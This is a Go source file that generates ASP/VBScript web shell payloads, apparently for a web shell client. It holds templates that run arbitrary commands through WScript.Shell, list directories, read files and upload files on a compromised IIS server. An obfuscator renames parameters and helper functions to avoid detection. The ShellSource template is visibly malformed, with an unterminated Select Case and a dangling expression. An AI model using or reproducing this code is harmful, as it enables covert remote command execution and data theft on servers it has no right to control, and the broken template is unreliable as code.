package asp

import (
	"fmt"
	"strings"
)

type ASPTemplates struct{}

func NewASPTemplates() *ASPTemplates { return &ASPTemplates{} }

func helperB64() string {
	return "Function b64d(s):With CreateObject(\"MSXML2.DOMDocument.6.0\").CreateElement(\"b64\"):.DataType=\"bin.base64\":.Text=s:b64d=BytesToStr(.NodeTypedValue):End With:End Function:" +
		"Function b64e(s):With CreateObject(\"MSXML2.DOMDocument.6.0\").CreateElement(\"b64\"):.DataType=\"bin.base64\":.Text=s:b64e=.Text:End With:End Function:" +
		"Function BytesToStr(b):Dim i,s:For i=1 To LenB(b):s=s&Chr(AscB(MidB(b,i,1))):Next:BytesToStr=s:End Function:"
}

func (t *ASPTemplates) Info() string {
	return helperB64() +
		"Dim wd,os,us:wd=Server.MapPath(\".\"):os=Request.ServerVariables(\"SERVER_SOFTWARE\"):us=\"unknown\":" +
		"Response.Write b64e(wd)&vbTab&b64e(os)&vbTab&b64e(us)"
}

func (t *ASPTemplates) Exec() string {
	return helperB64() +
		"Dim cmd,ws,ec,so:cmd=b64d(Request.Form(\"z1\")):" +
		"Set ws=CreateObject(\"WScript.Shell\"):Set ec=ws.Exec(cmd):so=ec.StdOut.ReadAll():" +
		"Response.Write so&\"ret=\"&ec.ExitCode"
}

func (t *ASPTemplates) FileList() string {
	return helperB64() +
		"Dim path,fso,f:path=b64d(Request.Form(\"z1\")):" +
		"Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.GetFolder(path):" +
		"For Each sf In f.SubFolders:Response.Write sf.Name&\"/\"&vbTab&sf.DateLastModified&vbTab&\"-1\"&vbTab&\"0755\"&vbCrLf:Next:" +
		"For Each fi In f.Files:Response.Write fi.Name&vbTab&fi.DateLastModified&vbTab&fi.Size&vbTab&\"0644\"&vbCrLf:Next"
}

func (t *ASPTemplates) FileRead() string {
	return helperB64() +
		"Dim path,fso,f,text:path=b64d(Request.Form(\"z1\")):" +
		"Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.OpenTextFile(path,1):" +
		"text=f.ReadAll():f.Close:Response.Write b64e(text)"
}

func (t *ASPTemplates) FileDownload() string { return t.FileRead() }

func (t *ASPTemplates) FileUpload() string {
	return helperB64() +
		"Dim path,content,fso,f:path=b64d(Request.Form(\"z1\")):content=b64d(Request.Form(\"z2\")):" +
		"Set fso=CreateObject(\"Scripting.FileSystemObject\"):Set f=fso.CreateTextFile(path,True,True):" +
		"f.Write content:f.Close:Response.Write \"1\""
}

func ShellSourceWith(obf *Obfuscator) string {
	code := ShellSource()
	return templateSubst(code, obf)
}

func ShellSource() string {
	return `<%@ Language="VBScript" %>` + "\n" +
		`<%` + "\n" +
		`Function b64d(s):With CreateObject("MSXML2.DOMDocument.6.0").CreateElement("b64"):.DataType="bin.base64":.Text=s:b64d=BytesToStr(.NodeTypedValue):End With:End Function` + "\n" +
		`Function b64e(s):With CreateObject("MSXML2.DOMDocument.6.0").CreateElement("b64"):.DataType="bin.base64":.Text=s:b64e=.Text:End With:End Function` + "\n" +
		`Function BytesToStr(b):Dim i,s:For i=1 To LenB(b):s=s&Chr(AscB(MidB(b,i,1))):Next:BytesToStr=s:End Function` + "\n" +
		`' P1.6: Inline dispatch
Select Case Request.Form("action")
	Case "info":
		(b64d(Request.Form("antpwd")))` + "\n" +
		`%>`
}

func templateSubst(code string, obf *Obfuscator) string {
	out := code
	out = strings.ReplaceAll(out, `Request.Form("z1")`, `Request.Form("`+obf.Param1()+`")`)
	out = strings.ReplaceAll(out, `Request.Form("z2")`, `Request.Form("`+obf.Param2()+`")`)
	out = strings.ReplaceAll(out, `b64d(`, obf.HelperDecode()+`(`)
	out = strings.ReplaceAll(out, `b64e(`, obf.HelperEncode()+`(`)
	out = strings.ReplaceAll(out, `BytesToStr(`, obf.HelperBTS()+`(`)
	return out
}

var _ = fmt.Sprintf
